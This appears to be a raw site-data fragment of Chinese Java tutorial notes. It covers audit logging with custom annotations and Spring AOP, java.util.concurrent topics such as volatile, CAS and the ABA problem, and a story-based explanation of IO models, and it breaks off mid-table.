常用方法\n\n//1.获取被代理类上注解\njoinPoint.getTarget().getClass().getAnnotation(注解类.class);\n//2.获取包名、类名\njoinPoint.getTarget().getClass().getPackage());\njoinPoint.getTarget().getClass().getSimpleName();\n//3.获取被代理类方法上的注解\nMethodSignature signature = (MethodSignature) joinPoint.getSignature();\n注解 methodAnnotion = signature.getMethod().getAnnotation(注解类.class);\n//4.获取方法名\nsignature.getMethod().getName();\n//5.获取第一个方法参数\nHashMap mapParam = (HashMap) joinPoint.getArgs()[0];\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 核心方法handleLogInfo()\n\n * 处理逻辑\n\n 1. 获取typeCode属性（会根据它配置相应模块的日志记录开关）：\n    判断切入的类和方法的某一注解上有没有对typeCode属性进行赋值，若都没有则默认不进行日志记录，直接return结束\n\n 2. 获取方法注解中forceRecord属性值（相当于判断是否必须记录）：\n    判断是否为需要强制记录的方法（增删改）\n    如果不是强制记录的方法，则根据日志类型（typeCode）查询判断记录开关是否为必须记录，是则记录\n\n 3. 书写逻辑，获取request和JoinPoint拼装参数进行日志记录\n\n 4. 对记录信息入库\n\n 5. 根据逻辑判断是否需要发送告警邮件',normalizedContent:' * 1. 编写注解\n   * 相关注解\n * 2. aop切入\n   * 相关注解\n   * joinpoint解析\n   * 核心方法handleloginfo()\n\n\n\n\n# 注解+aop实现日志记录\n\n * 使用注解+aop实现日志记录\n\n\n# 1. 编写注解\n\n * com.xxx.xx.util.auditlogger\n\n\n# 相关注解\n\n 1. @retention(retentionpolicy.runtime)：生命周期为运行时\n 2. @target( { java.lang.annotation.elementtype.method,\n    java.lang.annotation.elementtype.type }) ：该注解可以用于 类、接口，方法 上\n\npackage com.sgcc.bsp.util;\nimport java.lang.annotation.retention;\nimport java.lang.annotation.retentionpolicy;\nimport java.lang.annotation.target;\n\n@retention(retentionpolicy.runtime)\n@target( { java.lang.annotation.elementtype.method,  \n        java.lang.annotation.elementtype.type })  \npublic @interface auditlogger {  \n    \n    //日志记录\n    public abstract string log();  \n    //作用于类和方法上，如果方法注解中该属性不为空,则该方法的类型会覆盖类定义的类型\n    public codeenum typecode() default codeenum.null;\n    //作用于方法上，用于标记增加、删除、修改操作，这些操作必须被记录，不能被关闭\n    public boolean forcerecord() default false;\n    \n    public enum codeenum {\n    \t\n    \tsystem("0"),//系统日志\n    \tnull(""),\n    \tmanagement("1"),//管理模块\n    \tother("2"),//其它模块等\n    \tprivate string code;\n    \t\n    \tprivate codeenum(string code){\n    \t\tthis.code = code;\n    \t}\n    \tpublic string getcode() {\n    \t\treturn code;\n    \t}\n    \t\n    \tpublic void setcode(string code) {\n    \t\tthis.code = code;\n    \t}\n    }\n} \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n\n# 2. aop切入\n\n * com.xxx.xx.util.weblogaspect\n\n\n# 相关注解\n\n 1. @aspect：作用是把当前类标识为一个切面类供spring容器读取\n\n 2. @pointcut：pointcut是植入advice的触发条件。每个pointcut的定义包括2部分，一是表达式，二是方法签名。\n\n方法签名必须是 public及void型。可以将pointcut中的方法看作是一个被advice引用的助记符，因为表达式不直观，因此我们可以通过方法签名的方式为 此表达式命名。因此pointcut中的方法只需要方法签名，而不需要在方法体内编写实际代码。\n\n 3. @around：环绕增强，相当于methodinterceptor\n\n 4. @afterreturning：后置增强，相当于afterreturningadvice，方法正常退出时执行\n\n 5. @before：标识一个前置增强方法，相当于beforeadvice的功能，相似功能的还有\n\n 6. @afterthrowing：异常抛出增强，相当于throwsadvice\n\n 7. @after: final增强，不管是抛出异常或者正常退出都会执行\n\n@aspect\npublic class weblogaspect {\n\n    @pointcut("@annotation(com.xxx.xx.util.auditlogger)")\n    public void weblog(){}\n\n    @before("weblog()")\n    public void dobefore(joinpoint joinpoint) throws throwable {\n    }\n    \n    @after("weblog()")\n    public void doafter(joinpoint joinpoint) throws throwable {\n    }\n\n    @afterreturning(returning = "ret", pointcut = "weblog()")\n    public void doafterreturning(joinpoint joinpoint,object ret) throws throwable {\n\t\thandleloginfo(joinpoint,null);\n    }\n    \n    @afterthrowing(pointcut = "weblog()", throwing= "error")\n    public void afterthrowingadvice(joinpoint joinpoint, throwable error) throws exception{\n\t\thandleloginfo(joinpoint,error);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n# aspect方法执行顺序\n\nbefore around\nbefore\n-- sayhello() --\nafter around\nafter\nafter return\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# joinpoint解析\n\n * 获取代理类和被代理类对象\n\n方法名                         功能\nsignature getsignature();   获取封装了署名信息的对象,在该对象中可以获取到目标方法名,所属类的class等信息\nobject[] getargs();         获取传入目标方法的参数对象\nobject gettarget();         获取被代理的对象\nobject getthis();           获取代理对象\n\n * 常用方法\n\n//1.获取被代理类上注解\njoinpoint.gettarget().getclass().getannotation(注解类.class);\n//2.获取包名、类名\njoinpoint.gettarget().getclass().getpackage());\njoinpoint.gettarget().getclass().getsimplename();\n//3.获取被代理类方法上的注解\nmethodsignature signature = (methodsignature) joinpoint.getsignature();\n注解 methodannotion = signature.getmethod().getannotation(注解类.class);\n//4.获取方法名\nsignature.getmethod().getname();\n//5.获取第一个方法参数\nhashmap mapparam = (hashmap) joinpoint.getargs()[0];\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 核心方法handleloginfo()\n\n * 处理逻辑\n\n 1. 获取typecode属性（会根据它配置相应模块的日志记录开关）：\n    判断切入的类和方法的某一注解上有没有对typecode属性进行赋值，若都没有则默认不进行日志记录，直接return结束\n\n 2. 获取方法注解中forcerecord属性值（相当于判断是否必须记录）：\n    判断是否为需要强制记录的方法（增删改）\n    如果不是强制记录的方法，则根据日志类型（typecode）查询判断记录开关是否为必须记录，是则记录\n\n 3. 书写逻辑，获取request和joinpoint拼装参数进行日志记录\n\n 4. 对记录信息入库\n\n 5. 根据逻辑判断是否需要发送告警邮件',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"JUC 小结",frontmatter:{title:"JUC 小结",date:"2020-03-11T00:00:00.000Z",tags:["Java"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/juc.html",relativePath:"views/backend/juc.md",key:"v-5251b358",path:"/views/backend/juc.html",headers:[{level:2,title:"简介",slug:"简介",normalizedTitle:"简介",charIndex:3},{level:2,title:"volatile关键字",slug:"volatile关键字",normalizedTitle:"volatile关键字",charIndex:9},{level:2,title:"CAS原子类",slug:"cas原子类",normalizedTitle:"cas原子类",charIndex:24},{level:3,title:"ABA问题的解决",slug:"aba问题的解决",normalizedTitle:"aba问题的解决",charIndex:36},{level:2,title:"JUC下的常见类",slug:"juc下的常见类",normalizedTitle:"juc下的常见类",charIndex:48},{level:3,title:"JUC下的一些并发容器类：",slug:"juc下的一些并发容器类",normalizedTitle:"juc下的一些并发容器类：",charIndex:62},{level:3,title:"未完待续",slug:"未完待续",normalizedTitle:"未完待续",charIndex:81}],headersStr:"简介 volatile关键字 CAS原子类 ABA问题的解决 JUC下的常见类 JUC下的一些并发容器类： 未完待续",content:' * 简介\n * volatile关键字\n * CAS原子类\n   * ABA问题的解决\n * JUC下的常见类\n   * JUC下的一些并发容器类：\n   * 未完待续\n\n\n\n\n# 简介\n\n * 自JDK1.5出现的，JUC（Java并发包）就是java.util .concurrent工具包的简称。\n * 所属位置：jre1.8.0/lib/rj.jar，在jvm中rj.jar由👉bootsrap.classloader加载器通过双亲委派机制加载到内存。\n\n\n# volatile关键字\n\n * Java中各线程变量都是私有的，为 保证多线程共享数据，常用volatile 关键字修饰数据以保证共享数据在内存中的可见性。\n\n * 各线程数据都是从主内存中copy过来的，某一线程修改完数据之后再回写到主内存中去，加volatile就相当于一旦有一个线程修改完数据的同时主内存数据也修改同时通知其它线程这个数据已被修改其它线程停止对这个数据的所有操作（加volatile可以理解为直接操作主内存）\n   \n   public class TestVolatile {\n       public static void main(String[] args){ //这个线程是用来读取flag的值的\n           ThreadDemo threadDemo = new ThreadDemo();\n           Thread thread = new Thread(threadDemo);\n           thread.start();\n           while (true){\n               if (threadDemo.isFlag()){\n                   System.out.println("主线程读取到的flag = " + threadDemo.isFlag());\n                   break;\n               }\n           }\n       }\n   }\n   \n   @Data\n   class ThreadDemo implements Runnable{ //这个线程是用来修改flag的值的\n       public  boolean flag = false;\n       \n       //加volatile保证flag在主线程的可见性\n       //public  volatile boolean flag = false;\n       \n       @Override\n       public void run() {\n           try {\n               Thread.sleep(200);\n           } catch (InterruptedException e) {\n               e.printStackTrace();\n           }\n           flag = true;\n           System.out.println("ThreadDemo线程修改后的flag = " + isFlag());\n       }\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   26\n   27\n   28\n   29\n   30\n   31\n   32\n   \n\n * volatile和synchronized的区别：\n   \n   volatile禁止指令重排序。 volatile不具备互斥性(当一个线程持有锁时，其他线程进不来，这就是互斥性)。 volatile保证可见性但是不具备原子性(保证原子性：1.加锁、2.使用volatile保证可见，使用CAS原子类保证原子性)。\n\n\n# CAS原子类\n\n * CAS：CompareAndSet，CAS涉及3个元素:内存地址、期盼值和目标值，只有内存地址对应的值和期望的值相同时，才把内存地址对应的值修改为目标值。\n\n * CAS的缺点：\n   \n   * 效率低：底层采用遍历比较的方式，如果期望值和当前值比较不成功则会一直循环，时间一长导致CPU开销过大\n   \n   * 可能导致ABA问题：假设2个线程读取了主内存中的共享变量。如果一个线程对主内存中的值进行了修改后，又把新值改回了原来的值，而此时另一个线程进行CAS操作，发现原值和期盼的值是一样的，就顺利的进行了CAS操作。这就是CAS引发的ABA问题\n\n\n# ABA问题的解决\n\n * juc的atomic包下提供了AtomicStampedReference类，它相较于普通的Atomic原子类多增加了一个版本号的字段（相当于svn，git的版本号机制）\n * ABA问题的演示与解决\n\npackage com.zpj80321.znote.juc.volatiles;\n\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicReference;\nimport java.util.concurrent.atomic.AtomicStampedReference;\n\n/**\n * @Description : TODO 测试ABA问题的产生与解决\n */\npublic class ABA {\n\n    public static void main(String[] args) throws Exception\n    {\n        System.out.println("ABA问题的演示---------------------------------");\n        AtomicReference<Integer> atomicReference = new AtomicReference<>(10);\n\n        new Thread(()->{\n            //先将数据修改成其他值,再修改回原值\n            System.out.println(atomicReference.compareAndSet(10 , 11));\n            //修改回原值 :10\n            System.out.println(atomicReference.compareAndSet(11, 10));\n        },"A").start();\n\n        new Thread(()->{\n            try\n            {\n                //让当前线程停止3秒中,让 A 线程先完成ABA问题的修改,然后此线程再执行\n                TimeUnit.SECONDS.sleep(3);\n\n                System.out.println("经过ABA操作后,数据修改: "+\n                        atomicReference.compareAndSet(10,11)+" 为: " + atomicReference.get());\n            }\n            catch(Exception e)\n            {\n                e.printStackTrace();\n            }\n        },"B").start();\n\n        TimeUnit.SECONDS.sleep(4);\n        System.out.println("\\n\\nABA问题的解决办法---------------------------------------------------");\n\n        AtomicStampedReference<Integer> atomicStampedReference = new AtomicStampedReference<>(10,1);\n\n        new Thread(()->{\n\t\t\t//当前值，期望值，当前版本号，期望版本号\n            atomicStampedReference.compareAndSet(10,11,atomicStampedReference.getStamp(),atomicStampedReference.getStamp()+1);\n                //更改值的时候也更改版本号\n                System.out.println("C线程第一次修改后的版号为 ：　" +atomicStampedReference.getStamp());\n                //改回原值也要更新版本号\n                atomicStampedReference.compareAndSet(11,10,\n                        atomicStampedReference.getStamp(),atomicStampedReference.getStamp()+1);\n                System.out.println("C线程第二次修改后的版号为 ：　" +atomicStampedReference.getStamp());\n        },"C").start();\n\n        new Thread(()->{\n            try\n            {\n                TimeUnit.SECONDS.sleep(3);\n                System.out.println(\n                        "D线程修改: "\n                                +\n                         atomicStampedReference.compareAndSet(10,11,1,atomicStampedReference.getStamp()+1)\n                );\n\n            }\n            catch(Exception e)\n            {\n                e.printStackTrace();\n            }\n        },"D").start();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n\n\n\n# JUC下的常见类\n\n * JUC的atomic包下运用了CAS的AtomicBoolean、AtomicInteger、AtomicReference等原子变量类\n\n * JUC的locks包下的AbstractQueuedSynchronizer（AQS）以及使用AQS的ReentantLock（显式锁）、ReentrantReadWriteLock\n   \n   附：运用了AQS的类还有：Semaphore、CountDownLatch、ReentantLock（显式锁）、ReentrantReadWriteLock\n\n * JUC下的一些同步工具类：CountDownLatch（闭锁）、Semaphore（信号量）、CyclicBarrier（栅栏）、FutureTask\n\n\n# JUC下的一些并发容器类：\n\n 1. 使用写时复制类 CopyOnWriteArrayList，此类适合读多写少的场合,它的性能比Vector好的多。\n    \n    * 它的读取方法没有使用加锁操作，而是在使用add，set等修改操作的时候将原内容和要修改的内容复制到新的副本中，写完后，再将副本赋予原数据。\n    \n    /**\n      * Appends the specified element to the end of this list.\n      *\n      * @param e element to be appended to this list\n      * @return {@code true} (as specified by {@link Collection#add})\n      */\n    public boolean add(E e) {\n        final ReentrantLock lock = this.lock;\n        lock.lock();\n        try {\n            Object[] elements = getArray();\n            int len = elements.length;\n            Object[] newElements = Arrays.copyOf(elements, len + 1);\n            newElements[len] = e;\n            setArray(newElements);\n            return true;\n        } finally {\n            lock.unlock();\n        }\n    }\n    \n    /**\n      * 实现CopyOnWriteArraySet需要用到的方法\n      */\n    public boolean addIfAbsent(E e) {\n        Object[] snapshot = getArray();\n        return indexOf(e, snapshot, 0, snapshot.length) >= 0 ? false :\n        addIfAbsent(e, snapshot);\n    }\n    private static int indexOf(Object o, Object[] elements,\n                                   int index, int fence) {\n        if (o == null) {\n            for (int i = index; i < fence; i++)\n                if (elements[i] == null)\n                    return i;\n        } else {\n            for (int i = index; i < fence; i++)\n                if (o.equals(elements[i]))\n                    return i;\n        }\n        return -1;\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    \n\n 2. CopyOnWriteArraySet： 值得一提的是：CopyOnWriteArraySet使用CopyOnWriteArrayList实现。\n    \n    private final CopyOnWriteArrayList<E> al;\n    \n    public boolean add(E e) {\n        //还是遍历list，看是否有这个元素\n        return al.addIfAbsent(e);\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    \n\n 3. ConcurrentHashMap: 并发map，很好的支持高性能和高并发（分段锁）。\n    \n    * jdk1.7之前使用分段数组+链表实现。jdk1.8后使用 数组+链表/红黑树 实现\n    \n    * jdk1.7之前给每段数据加锁，当一个线程访问其中一段数据时，其他数据也能被其他线程访问，也是非常的高效\n    \n    * jdk1.8后使用数组+链表/红黑树实现，其扩容等机制与HashMap一样，但是控制并发的方法改为了CAS+synchronized\n      \n      synchronized锁的只是链表的首节点或红黑树的首节点，这样一来，只要节点不冲突(hash不冲突)，synchronized也不会触发，更加高效\n\n\n# 未完待续',normalizedContent:' * 简介\n * volatile关键字\n * cas原子类\n   * aba问题的解决\n * juc下的常见类\n   * juc下的一些并发容器类：\n   * 未完待续\n\n\n\n\n# 简介\n\n * 自jdk1.5出现的，juc（java并发包）就是java.util .concurrent工具包的简称。\n * 所属位置：jre1.8.0/lib/rj.jar，在jvm中rj.jar由👉bootsrap.classloader加载器通过双亲委派机制加载到内存。\n\n\n# volatile关键字\n\n * java中各线程变量都是私有的，为 保证多线程共享数据，常用volatile 关键字修饰数据以保证共享数据在内存中的可见性。\n\n * 各线程数据都是从主内存中copy过来的，某一线程修改完数据之后再回写到主内存中去，加volatile就相当于一旦有一个线程修改完数据的同时主内存数据也修改同时通知其它线程这个数据已被修改其它线程停止对这个数据的所有操作（加volatile可以理解为直接操作主内存）\n   \n   public class testvolatile {\n       public static void main(string[] args){ //这个线程是用来读取flag的值的\n           threaddemo threaddemo = new threaddemo();\n           thread thread = new thread(threaddemo);\n           thread.start();\n           while (true){\n               if (threaddemo.isflag()){\n                   system.out.println("主线程读取到的flag = " + threaddemo.isflag());\n                   break;\n               }\n           }\n       }\n   }\n   \n   @data\n   class threaddemo implements runnable{ //这个线程是用来修改flag的值的\n       public  boolean flag = false;\n       \n       //加volatile保证flag在主线程的可见性\n       //public  volatile boolean flag = false;\n       \n       @override\n       public void run() {\n           try {\n               thread.sleep(200);\n           } catch (interruptedexception e) {\n               e.printstacktrace();\n           }\n           flag = true;\n           system.out.println("threaddemo线程修改后的flag = " + isflag());\n       }\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   26\n   27\n   28\n   29\n   30\n   31\n   32\n   \n\n * volatile和synchronized的区别：\n   \n   volatile禁止指令重排序。 volatile不具备互斥性(当一个线程持有锁时，其他线程进不来，这就是互斥性)。 volatile保证可见性但是不具备原子性(保证原子性：1.加锁、2.使用volatile保证可见，使用cas原子类保证原子性)。\n\n\n# cas原子类\n\n * cas：compareandset，cas涉及3个元素:内存地址、期盼值和目标值，只有内存地址对应的值和期望的值相同时，才把内存地址对应的值修改为目标值。\n\n * cas的缺点：\n   \n   * 效率低：底层采用遍历比较的方式，如果期望值和当前值比较不成功则会一直循环，时间一长导致cpu开销过大\n   \n   * 可能导致aba问题：假设2个线程读取了主内存中的共享变量。如果一个线程对主内存中的值进行了修改后，又把新值改回了原来的值，而此时另一个线程进行cas操作，发现原值和期盼的值是一样的，就顺利的进行了cas操作。这就是cas引发的aba问题\n\n\n# aba问题的解决\n\n * juc的atomic包下提供了atomicstampedreference类，它相较于普通的atomic原子类多增加了一个版本号的字段（相当于svn，git的版本号机制）\n * aba问题的演示与解决\n\npackage com.zpj80321.znote.juc.volatiles;\n\nimport java.util.concurrent.timeunit;\nimport java.util.concurrent.atomic.atomicreference;\nimport java.util.concurrent.atomic.atomicstampedreference;\n\n/**\n * @description : todo 测试aba问题的产生与解决\n */\npublic class aba {\n\n    public static void main(string[] args) throws exception\n    {\n        system.out.println("aba问题的演示---------------------------------");\n        atomicreference<integer> atomicreference = new atomicreference<>(10);\n\n        new thread(()->{\n            //先将数据修改成其他值,再修改回原值\n            system.out.println(atomicreference.compareandset(10 , 11));\n            //修改回原值 :10\n            system.out.println(atomicreference.compareandset(11, 10));\n        },"a").start();\n\n        new thread(()->{\n            try\n            {\n                //让当前线程停止3秒中,让 a 线程先完成aba问题的修改,然后此线程再执行\n                timeunit.seconds.sleep(3);\n\n                system.out.println("经过aba操作后,数据修改: "+\n                        atomicreference.compareandset(10,11)+" 为: " + atomicreference.get());\n            }\n            catch(exception e)\n            {\n                e.printstacktrace();\n            }\n        },"b").start();\n\n        timeunit.seconds.sleep(4);\n        system.out.println("\\n\\naba问题的解决办法---------------------------------------------------");\n\n        atomicstampedreference<integer> atomicstampedreference = new atomicstampedreference<>(10,1);\n\n        new thread(()->{\n\t\t\t//当前值，期望值，当前版本号，期望版本号\n            atomicstampedreference.compareandset(10,11,atomicstampedreference.getstamp(),atomicstampedreference.getstamp()+1);\n                //更改值的时候也更改版本号\n                system.out.println("c线程第一次修改后的版号为 ：　" +atomicstampedreference.getstamp());\n                //改回原值也要更新版本号\n                atomicstampedreference.compareandset(11,10,\n                        atomicstampedreference.getstamp(),atomicstampedreference.getstamp()+1);\n                system.out.println("c线程第二次修改后的版号为 ：　" +atomicstampedreference.getstamp());\n        },"c").start();\n\n        new thread(()->{\n            try\n            {\n                timeunit.seconds.sleep(3);\n                system.out.println(\n                        "d线程修改: "\n                                +\n                         atomicstampedreference.compareandset(10,11,1,atomicstampedreference.getstamp()+1)\n                );\n\n            }\n            catch(exception e)\n            {\n                e.printstacktrace();\n            }\n        },"d").start();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n\n\n\n# juc下的常见类\n\n * juc的atomic包下运用了cas的atomicboolean、atomicinteger、atomicreference等原子变量类\n\n * juc的locks包下的abstractqueuedsynchronizer（aqs）以及使用aqs的reentantlock（显式锁）、reentrantreadwritelock\n   \n   附：运用了aqs的类还有：semaphore、countdownlatch、reentantlock（显式锁）、reentrantreadwritelock\n\n * juc下的一些同步工具类：countdownlatch（闭锁）、semaphore（信号量）、cyclicbarrier（栅栏）、futuretask\n\n\n# juc下的一些并发容器类：\n\n 1. 使用写时复制类 copyonwritearraylist，此类适合读多写少的场合,它的性能比vector好的多。\n    \n    * 它的读取方法没有使用加锁操作，而是在使用add，set等修改操作的时候将原内容和要修改的内容复制到新的副本中，写完后，再将副本赋予原数据。\n    \n    /**\n      * appends the specified element to the end of this list.\n      *\n      * @param e element to be appended to this list\n      * @return {@code true} (as specified by {@link collection#add})\n      */\n    public boolean add(e e) {\n        final reentrantlock lock = this.lock;\n        lock.lock();\n        try {\n            object[] elements = getarray();\n            int len = elements.length;\n            object[] newelements = arrays.copyof(elements, len + 1);\n            newelements[len] = e;\n            setarray(newelements);\n            return true;\n        } finally {\n            lock.unlock();\n        }\n    }\n    \n    /**\n      * 实现copyonwritearrayset需要用到的方法\n      */\n    public boolean addifabsent(e e) {\n        object[] snapshot = getarray();\n        return indexof(e, snapshot, 0, snapshot.length) >= 0 ? false :\n        addifabsent(e, snapshot);\n    }\n    private static int indexof(object o, object[] elements,\n                                   int index, int fence) {\n        if (o == null) {\n            for (int i = index; i < fence; i++)\n                if (elements[i] == null)\n                    return i;\n        } else {\n            for (int i = index; i < fence; i++)\n                if (o.equals(elements[i]))\n                    return i;\n        }\n        return -1;\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    \n\n 2. copyonwritearrayset： 值得一提的是：copyonwritearrayset使用copyonwritearraylist实现。\n    \n    private final copyonwritearraylist<e> al;\n    \n    public boolean add(e e) {\n        //还是遍历list，看是否有这个元素\n        return al.addifabsent(e);\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    \n\n 3. concurrenthashmap: 并发map，很好的支持高性能和高并发（分段锁）。\n    \n    * jdk1.7之前使用分段数组+链表实现。jdk1.8后使用 数组+链表/红黑树 实现\n    \n    * jdk1.7之前给每段数据加锁，当一个线程访问其中一段数据时，其他数据也能被其他线程访问，也是非常的高效\n    \n    * jdk1.8后使用数组+链表/红黑树实现，其扩容等机制与hashmap一样，但是控制并发的方法改为了cas+synchronized\n      \n      synchronized锁的只是链表的首节点或红黑树的首节点，这样一来，只要节点不冲突(hash不冲突)，synchronized也不会触发，更加高效\n\n\n# 未完待续',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"IO 模型",frontmatter:{title:"IO 模型",date:"2022-02-03T00:00:00.000Z",tags:["IO模型"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/java_io%E6%A8%A1%E5%9E%8B.html",relativePath:"views/backend/java_io模型.md",key:"v-bc07d04c",path:"/views/backend/java_io%E6%A8%A1%E5%9E%8B.html",headers:[{level:2,title:"简单理解各IO模型",slug:"简单理解各io模型",normalizedTitle:"简单理解各io模型",charIndex:3},{level:3,title:"1. 阻塞IO模型",slug:"_1-阻塞io模型",normalizedTitle:"1. 阻塞io模型",charIndex:18},{level:3,title:"2. 非阻塞IO模型",slug:"_2-非阻塞io模型",normalizedTitle:"2. 非阻塞io模型",charIndex:33},{level:3,title:"3. IO复用模型",slug:"_3-io复用模型",normalizedTitle:"3. io复用模型",charIndex:49},{level:3,title:"4. 信号驱动IO模型",slug:"_4-信号驱动io模型",normalizedTitle:"4. 信号驱动io模型",charIndex:64},{level:3,title:"5. 异步IO模型",slug:"_5-异步io模型",normalizedTitle:"5. 异步io模型",charIndex:81},{level:2,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:94},{level:2,title:"结合实际场景，理解同步、异步、阻塞、非阻塞的两两组合",slug:"结合实际场景-理解同步、异步、阻塞、非阻塞的两两组合",normalizedTitle:"结合实际场景，理解同步、异步、阻塞、非阻塞的两两组合",charIndex:100},{level:3,title:"同步阻塞（Synchronous Blocking）",slug:"同步阻塞-synchronous-blocking",normalizedTitle:"同步阻塞（synchronous blocking）",charIndex:132},{level:3,title:"同步非阻塞（Synchronous Non-blocking）",slug:"同步非阻塞-synchronous-non-blocking",normalizedTitle:"同步非阻塞（synchronous non-blocking）",charIndex:164},{level:3,title:"异步阻塞（Asynchronous Blocking）",slug:"异步阻塞-asynchronous-blocking",normalizedTitle:"异步阻塞（asynchronous blocking）",charIndex:201},{level:3,title:"异步非阻塞（Asynchronous Non-blocking）",slug:"异步非阻塞-asynchronous-non-blocking",normalizedTitle:"异步非阻塞（asynchronous non-blocking）",charIndex:234},{level:3,title:"IO多路复用（IO Multiplexing）",slug:"io多路复用-io-multiplexing",normalizedTitle:"io多路复用（io multiplexing）",charIndex:272},{level:2,title:"实际场景总结",slug:"实际场景总结",normalizedTitle:"实际场景总结",charIndex:299},{level:2,title:"参考",slug:"参考",normalizedTitle:"参考",charIndex:309}],headersStr:"简单理解各IO模型 1. 阻塞IO模型 2. 非阻塞IO模型 3. IO复用模型 4. 信号驱动IO模型 5. 异步IO模型 总结 结合实际场景，理解同步、异步、阻塞、非阻塞的两两组合 同步阻塞（Synchronous Blocking） 同步非阻塞（Synchronous Non-blocking） 异步阻塞（Asynchronous Blocking） 异步非阻塞（Asynchronous Non-blocking） IO多路复用（IO Multiplexing） 实际场景总结 参考",content:" * 简单理解各IO模型\n   * 1. 阻塞IO模型\n   * 2. 非阻塞IO模型\n   * 3. IO复用模型\n   * 4. 信号驱动IO模型\n   * 5. 异步IO模型\n * 总结\n * 结合实际场景，理解同步、异步、阻塞、非阻塞的两两组合\n   * 同步阻塞（Synchronous Blocking）\n   * 同步非阻塞（Synchronous Non-blocking）\n   * 异步阻塞（Asynchronous Blocking）\n   * 异步非阻塞（Asynchronous Non-blocking）\n   * IO多路复用（IO Multiplexing）\n * 实际场景总结\n * 参考\n\n\n\n借用知乎用于 Levin 的回答，对各种模型讲个故事，描述下各个IO模型的区别。\n\n\n# 简单理解各IO模型\n\n故事情节为：老李去买火车票，三天后买到一张退票。参演人员（老李，黄牛，售票员，快递员），往返车站耗费1小时。\n\n\n# 1. 阻塞IO模型\n\n老李去火车站买票，排队三天买到一张退票。\n\n耗费：在车站吃喝拉撒睡 3天，其他事一件没干。\n\n\n# 2. 非阻塞IO模型\n\n老李去火车站买票，隔12小时去火车站问有没有退票，三天后买到一张票。\n\n耗费：往返车站6次，路上6小时，其他时间做了好多事。\n\n\n# 3. IO复用模型\n\n * select/poll（有selector选择器，去轮询选择器）\n\n老李去火车站买票，委托黄牛，然后每隔6小时电话黄牛询问，黄牛三天内买到票，然后老李去火车站交钱领票。\n\n耗费：往返车站2次，路上2小时，黄牛手续费100元，打电话17次\n\n * epoll（事件回调）\n\n老李去火车站买票，委托黄牛，黄牛买到后即通知老李去领，然后老李去火车站交钱领票。\n\n耗费：往返车站2次，路上2小时，黄牛手续费100元，无需打电话\n\n\n# 4. 信号驱动IO模型\n\n老李去火车站买票，给售票员留下电话，有票后，售票员电话通知老李，然后老李去火车站交钱领票。\n\n耗费：往返车站2次，路上2小时，免黄牛费100元，无需打电话\n\n\n# 5. 异步IO模型\n\n老李去火车站买票，给售票员留下电话，有票后，售票员电话通知老李并快递送票上门。\n\n耗费：往返车站1次，路上1小时，免黄牛费100元，无需打电话\n\n\n# 总结\n\n1同2的区别是：自己轮询\n\n2同3的区别是：委托黄牛\n\n3同4的区别是：电话代替黄牛\n\n4同5的区别是：电话通知是自取还是送票上门\n\n * 阻塞IO模型：单线程一直阻塞直到事件发生才处理，期间干不了其他事情\n\n * 非阻塞IO模型：while(true) 不断循环看有没有事件发生才处理，期间可以干其他事情，但是需要自己不断的去监测\n\n * IO复用模型：基于事件驱动（类似与页面的一个button一个事件），有事件发生才处理，期间可以干其他事情，可以理解有一个中间人selector替我们监听， 有事件后通知我们去处理\n\n              同步阻塞IO   伪异步IO    NIO      AIO\n客户端数目 ：IO线程   1 : 1    m : n    m : 1    m : 0\nIO模型          同步阻塞IO   同步阻塞IO   同步阻塞IO   